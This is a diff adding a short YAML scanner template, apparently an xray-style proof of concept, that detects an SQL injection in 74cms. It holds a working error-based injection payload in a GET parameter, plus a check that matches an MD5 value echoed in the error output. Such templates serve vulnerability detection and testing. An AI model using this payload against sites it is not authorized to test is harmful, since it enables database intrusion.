@@ -1,0 +1,10 @@
+name: poc-yaml-74cms-sqli
+rules:
+  - method: GET
+    path: /index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and extractvalue(1,concat(0x7e,md5(99999999))) -- a
+    expression: |
+      response.body.bcontains(b"ef775988943825d2871e1cfa75473ec")
+detail:
+  author: jinqi
+  links:
+    - https://www.t00ls.net/articles-54436.html
